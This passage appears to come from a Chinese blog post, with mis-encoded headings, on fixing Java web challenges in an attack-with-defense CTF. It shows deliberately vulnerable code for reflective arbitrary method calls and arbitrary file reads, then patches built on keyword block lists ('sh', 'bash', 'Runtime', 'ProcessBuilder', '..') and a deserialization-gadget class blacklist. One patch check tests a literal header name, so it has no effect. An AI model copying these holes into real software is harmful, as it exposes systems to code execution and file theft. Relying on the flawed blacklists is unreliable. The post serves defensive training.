string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä»»æ„æ–¹æ³•è°ƒç”¨"><a href="#ä»»æ„æ–¹æ³•è°ƒç”¨" class="headerlink" title="ä»»æ„æ–¹æ³•è°ƒç”¨"></a>ä»»æ„æ–¹æ³•è°ƒç”¨</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogOutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/logout"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"logout"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> method<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"com.mengda.awd.Utils.SessionUtils"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> targetclass<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token class-name">ObjectClass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>targetclass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> <span class="token class-name">CLassInstance</span> <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">HttpSession</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> session <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fixï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogOutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/logout"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"logout"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> method<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"com.mengda.awd.Utils.SessionUtils"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> targetclass<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blackList <span class="token operator">=</span> <span class="token punctuation">&#123;</span>         <span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"tac"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"Runtime"</span><span class="token punctuation">,</span> <span class="token string">"ProcessBuilder"</span><span class="token punctuation">,</span>         <span class="token string">"ProcessImpl"</span><span class="token punctuation">,</span> <span class="token string">"UNIXProcess"</span><span class="token punctuation">,</span> <span class="token string">"File"</span><span class="token punctuation">,</span> <span class="token string">"Read"</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">,</span> <span class="token string">"build"</span><span class="token punctuation">,</span> <span class="token string">"start"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>targetclass<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token class-name">ObjectClass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>targetclass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> <span class="token class-name">CLassInstance</span> <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">HttpSession</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> session <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod2 <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod2<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> myFilter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>    <span class="token class-name">String</span> request_uri <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Check</span><span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> static_resources_path <span class="token operator">=</span> <span class="token string">"/usr/local/tomcat/webapps/app/WEB-INF/classes/static/"</span> <span class="token operator">+</span> request_uri<span class="token punctuation">;</span>      static_resources_path <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>static_resources_path<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>static_resources_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"error~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fixï¼šç›´æ¥å¯¹Fileç±»ä¸‹æ‰‹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token class-name">String</span> filePath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blackList <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">".."</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>filePath<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token class-name">String</span> file_content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">int</span> readCount <span class="token operator">=</span> fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>readCount <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>           file_content <span class="token operator">=</span> file_content <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> readCount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> file_content<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> th<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">throw</span> th<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é‡å†™resolveClass"><a href="#é‡å†™resolveClass" class="headerlink" title="é‡å†™resolveClass"></a>é‡å†™resolveClass</h3><p>å‚è€ƒï¼š<a href="https://flowerwind.github.io/2021/05/01/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E9%87%8D%E5%86%99resolveClass%E6%9D%A5%E7%99%BD%E5%90%8D%E5%8D%95%E9%98%B2%E5%BE%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://flowerwind.github.io/2021/05/01/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E9%87%8D%E5%86%99resolveClass%E6%9D%A5%E7%99%BD%E5%90%8D%E5%8D%95%E9%98%B2%E5%BE%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p>åœ¨å°†å­—èŠ‚ç æ¢å¤ä¸ºç±»çš„è¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨äº†<code>resolveClass</code>æ–¹æ³•ï¼Œè€Œè¿™ä¸ªresolveClassæ–¹æ³•å¦‚æœè¢«é‡å†™çš„è¯ï¼Œè°ƒç”¨çš„å°±æ˜¯é‡å†™ç±»çš„resolvceClass</p><p>æˆ‘ä»¬å¦‚æœåœ¨é‡å†™çš„resolvceClassä¸­å†™å…¥ä»£ç ï¼Œå³å¯æ§åˆ¶éœ€è¦æ¢å¤ç±»çš„åç§°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> s<span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized deserialization attempt"</span><span class="token punctuation">,</span> desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.springframework"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.security.SignedObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token 